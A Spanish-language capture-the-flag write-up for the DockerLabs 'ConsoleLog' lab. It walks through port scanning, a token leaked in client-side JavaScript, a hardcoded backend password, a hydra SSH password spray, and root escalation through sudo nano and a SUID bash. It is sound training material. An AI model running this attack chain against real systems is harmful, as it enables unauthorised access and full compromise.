---
title: ConsoleLog
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-05-30
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-consolelog/consolelog_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - http
  - ssh
  - data_leaks
  - java_script
  - fuzzing_web
  - password_attacks
  - sudo_abuse
  - suid
  - information_gathering
  - web_analysis
  - data_leak_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/consolelog:-$ ping -c 1 172.17.0.03
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.032 ms

--- 172.17.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/consolelog:-$ nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.3 -n -Pn -oG nmap1
Host: 172.17.0.3 ()	Status: Up
Host: 172.17.0.3 ()	Ports: 80/open/tcp//http///, 3000/open/tcp//ppp///, 5000/open/tcp//upnp///	Ignored State: closed (65532)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/consolelog:-$ nmap -sCV -vvv -p80,3000,5000 -oN nmap/nmap2 172.17.0.3
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Mi Sitio
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
3000/tcp open  http    syn-ack ttl 64 Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Error
5000/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 f837107e16a227b83a6e2c16357d14fe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFJIePZQO0+XTgRiD8dhTqAlZt67hcjqMdzF07uhb1UjckCZ085MdTFxg46SKaJRwi1OiB8GT+SeIlFbvm99Xkc=
|   256 cd11106460e8bfd9a4f48eae3bd8e18d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESd2Y3i6yTEAk2fPflmI3fA4pNsVZub38LafzPteZlz
MAC Address: 5A:62:7A:E6:4C:58 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/dockerlabs/consolelog:-$ whatweb 172.17.0.3
http://172.17.0.3 [200 OK] Apache[2.4.61], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.61 (Debian)], IP[172.17.0.3], Script, Title[Mi Sitio]
```

---
## Web Analysis

Accedo al sitio principal y visualizo una página básica con un título y un botón marcado como "Boton en fase beta".

![](assets/img/dockerlabs-writeup-consolelog/consolelog1_1.png)

Inspeccionando el botón, identifico que ejecuta la función `autenticate()` definida en el archivo `authentication.js`.

![](assets/img/dockerlabs-writeup-consolelog/consolelog1_2.png)

Revisando su contenido, descubro que imprime un mensaje de depuración que expone el token requerido por el endpoint `/recurso/`.

![](assets/img/dockerlabs-writeup-consolelog/consolelog1_3.png)

Envio el token mediante una solicitud POST al puerto 3000 y obtengo como respuesta una cadena en texto plano que aparenta ser una contraseña.

```terminal
/home/kali/Documents/dockerlabs/consolelog:-$ curl -X POST http://172.17.0.3:3000/recurso/ -H "Content-Type: application/json" -d '{"token":"tokentraviesito"}'
lapassworddebackupmaschingonadetodas
```

Sin embargo, fuzzeando la web descubro el directorio abierto `/backend/`, el cual expone el archivo `server.js`.

```terminal
/home/kali/Documents/dockerlabs/consolelog:-$ dirb http://172.17.0.3/
---- Scanning URL: http://172.17.0.3/ ----
==> DIRECTORY: http://172.17.0.3/backend/
+ http://172.17.0.3/index.html (CODE:200|SIZE:234)
==> DIRECTORY: http://172.17.0.3/javascript/
```

![](assets/img/dockerlabs-writeup-consolelog/consolelog1_4.png)

Dentro del script encuentro la implementación del endpoint `/recurso/`, confirmando que la contraseña se encuentra hardcodeada en el backend.

![](assets/img/dockerlabs-writeup-consolelog/consolelog1_5.png)

---
## Data Leak Exploitation

Utilizo la contraseña descubierta anteriormente para realizar un ataque de fuerza bruta sobre el servicio SSH expuesto en el puerto 5000.

```terminal
/home/kali/Documents/dockerlabs/consolelog:-$ hydra -L /opt/seclists/Usernames/xato-net-10-million-usernames.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.3:5000 -t 40 -I
[5000][ssh] host: 172.17.0.3   login: lovely   password: lapassworddebackupmaschingonadetodas
```

El ataque resulta exitoso con el usuario `lovely` y accedo al sistema mediante SSH con las credenciales obtenidas.

```terminal
/home/kali/Documents/dockerlabs/consolelog:-$ ssh lovely@172.17.0.3 -p 5000 
lovely@172.17.0.3's password: lapassworddebackupmaschingonadetodas

lovely@413f463a3fce:~$ id
uid=1001(lovely) gid=1001(lovely) groups=1001(lovely),100(users)
```

---
## Privilege Escalation

```terminal
lovely@413f463a3fce:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
tester:x:1000:1000::/home/tester:/bin/bash
lovely:x:1001:1001:lovely,,,:/home/lovely:/bin/bash
```

Identifico que el usuario `lovely` tiene permisos de `sudo` sobre el binario `/usr/bin/nano` sin requerir contraseña.

```terminal
lovely@413f463a3fce:~$ sudo -l
Matching Defaults entries for lovely on 413f463a3fce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User lovely may run the following commands on 413f463a3fce:
    (ALL) NOPASSWD: /usr/bin/nano
```

De acuerdo a [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo), `nano` ejecutado con `sudo` puede usarse para escalar privilegios, ya que no elimina los permisos elevados durante su ejecución.

Lanzo nano como superusuario.

```terminal
lovely@413f463a3fce:~$ sudo nano
```

Y ejecuto la siguiente secuencia para obtener una shell privilegiada

* `Ctrl + r`, `Ctrl + x`
* Command to execute: `reset; sh 1>&0 2>&0`
* `# chmod u+s /bin/bash`
* `# exit`

Salgo sin guardar cambios

* `Ctrl + x`, Save modifed buffer? `n`

Esto activa el bit SUID en `/bin/bash`.

{% include embed/video.html src='assets/img/dockerlabs-writeup-consolelog/consolelog1_6.webm' types='webm' title='Sudo Abuse' autoplay=true loop=true muted=true %}

Por ultimo, ejecuto `bash -p` para iniciar una shell con privilegios de `root`.

```terminal
lovely@413f463a3fce:~$ bash -p

bash-5.2# id
uid=1001(lovely) gid=1001(lovely) euid=0(root) groups=1001(lovely),100(users)
```
